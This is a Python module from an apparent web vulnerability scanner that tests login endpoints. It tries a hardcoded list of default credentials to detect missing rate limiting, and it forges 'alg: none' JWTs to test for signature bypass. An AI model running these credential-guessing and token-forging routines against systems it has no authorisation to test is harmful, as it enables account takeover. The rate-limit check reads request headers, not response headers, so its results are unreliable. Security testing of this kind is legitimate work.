"""Authentication checks — brute force protection, account enum, weak JWTs."""

from __future__ import annotations

import base64
import json
import re
import time

import httpx

from .base import BaseCheck, FindingDraft

_COMMON_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("test", "test"), ("root", "root"), ("user", "user"),
]

_USER_ENUM_PATTERNS = re.compile(
    r"user not found|no account|invalid username|email not registered|"
    r"no such user|user does not exist",
    re.I,
)


class AuthCheck(BaseCheck):
    name = "auth"
    description = "Test authentication controls: brute force protection, account enumeration, JWT weaknesses"
    vuln_class = "Broken Authentication"
    references = [
        "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
        "https://cwe.mitre.org/data/definitions/307.html",
        "https://cwe.mitre.org/data/definitions/204.html",
    ]
    applicable_categories = ["authentication"]

    async def run(self, vector, client: httpx.AsyncClient, ai=None) -> list[FindingDraft]:
        findings: list[FindingDraft] = []
        url = vector.url

        # 1. Brute force protection — try 5 failed logins, check for lockout/rate limit
        findings.extend(await self._check_brute_force(url, client))

        # 2. JWT weakness check if JWT tokens are present in params
        if any(re.search(r"token|jwt|bearer", p, re.I) for p in vector.parameters):
            findings.extend(await self._check_jwt(url, vector.parameters, client))

        return findings

    async def _check_brute_force(
        self, url: str, client: httpx.AsyncClient
    ) -> list[FindingDraft]:
        """Attempt 5 rapid logins; if no rate limit/lockout, flag it."""
        statuses: list[int] = []
        try:
            for user, password in _COMMON_CREDS[:5]:
                resp = await client.post(
                    url,
                    data={"username": user, "password": password},
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
                statuses.append(resp.status_code)

            # If all responses are 200 or 401 without lockout, no rate limiting
            rate_limit_headers = {k.lower() for k in client.headers}
            if (
                all(s in (200, 401, 403) for s in statuses) and
                not any(h in rate_limit_headers for h in ("x-ratelimit-limit", "retry-after"))
            ):
                evidence = f"5 login attempts returned status codes: {statuses}\nNo rate-limiting headers observed."
                return [FindingDraft(
                    title=f"Missing brute force protection at {url}",
                    vuln_class=self.vuln_class,
                    severity="medium",
                    url=url,
                    description="No rate limiting or account lockout detected after 5 failed login attempts.",
                    evidence=evidence,
                    references=self.references,
                )]
        except Exception:
            pass
        return []

    async def _check_jwt(
        self, url: str, params: list[str], client: httpx.AsyncClient
    ) -> list[FindingDraft]:
        """Look for JWT in params; try alg:none attack."""
        findings: list[FindingDraft] = []
        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(url)
        qs = parse_qs(parsed.query)

        for param in params:
            token = qs.get(param, [""])[0]
            if not token or not token.startswith("eyJ"):
                continue

            # Try alg:none
            try:
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                header = json.loads(base64.b64decode(parts[0] + "=="))
                header["alg"] = "none"
                new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip("=")
                forged = f"{new_header}.{parts[1]}."

                from urllib.parse import urlencode, urlunparse
                new_qs = dict(qs)
                new_qs[param] = [forged]
                test_url = urlunparse(parsed._replace(query=urlencode(new_qs, doseq=True)))
                resp = await client.get(test_url)

                if resp.status_code == 200 and len(resp.text) > 50:
                    findings.append(FindingDraft(
                        title=f"JWT algorithm confusion (alg:none) in `{param}`",
                        vuln_class="JWT Vulnerability",
                        severity="critical",
                        url=url,
                        parameter=param,
                        description="Server accepted a JWT with alg:none, bypassing signature verification.",
                        evidence=f"Forged JWT accepted. Response: HTTP {resp.status_code}, {len(resp.text)} bytes.",
                        references=[
                            "https://portswigger.net/web-security/jwt",
                            "https://cwe.mitre.org/data/definitions/347.html",
                        ],
                    ))
            except Exception:
                continue
        return findings
